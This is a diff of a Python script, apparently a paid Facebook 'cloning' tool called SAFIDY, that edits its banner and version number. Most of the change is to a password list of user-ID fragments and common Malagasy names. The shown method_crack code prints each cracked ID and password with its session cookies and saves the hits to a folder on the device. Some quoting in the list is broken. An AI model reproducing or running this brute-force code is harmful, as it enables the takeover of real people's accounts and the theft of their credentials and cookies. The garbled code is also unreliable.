@@ -1,5 +1,5 @@
 # Définir le numéro de version
-version_actuelle = "5.0"
+version_actuelle = "2.0"
 
 
 
@@ -66,11 +66,12 @@ logo=(f'''{B}
                                             
 
 {warna}--------------------------------------------{B}
- Owner    : {M}SAFIDY03{M}
+ Owner    : {M}SAFIDINIAINA{M}
  TOOL NAME : {warna}{P}SAFIDY{P}{warna}
+ GROUPE-FB   : NONE
  STATUE : {H}PAID{H}
  Facebook : {bblue}SM{bblue}
- Tools    : {warna}[{M}VERSION 5.0{warna}]{warna}
+ Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -116,7 +117,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nantenaina','Nantenaina','nomena','Nomena', 'rakoto', 'Rakoto', 'diamondra', 'Diamondra', 'fandresena', 'Fandresena', 'gerard', 'Gerard', 'mendrika', 'Mendrika', 'lalaina', 'Antananarivo', 'antananarivo', 'Lalaina', 'rakotomalala', 'Rakotomalala', 'rakotonirina','Rakotonirina','anthonio','Anthonio','ferdinand','Ferdinand,'mahery','Mahery','malagasy','Malagasy','mirah','Mirah']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'Nantenaina,'nantenaina','rakoto','Rakoto', 'fandresena', 'Fandresena', 'nomena', 'Nomena', 'lalaina', 'Lalaina', 'diamondra', 'Diamondra', 'mendrika', 'Mendrika', 'finaritra', 'Antananarivo', 'antananarivo', 'Finaritra', 'fanomezana', 'Fanomezana', 'lalatiana','Lalatiana','mialy','Mialy,','mandresy','Mandresy','mahery,','Mahery','malagasy','Malagasy']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
@@ -150,7 +151,7 @@ def method_crack(ids, passlist):
                     print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
-                    # Vérifier si le dossier ITACHI-IDS existe et le créer si nécessaire
+                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
                     if not os.path.exists("/sdcard/SAFIDY-IDS"):
                         os.makedirs("/sdcard/SAFIDY-IDS")
                     # Enregistrer dans le fichier SAFIDY-OK.txt
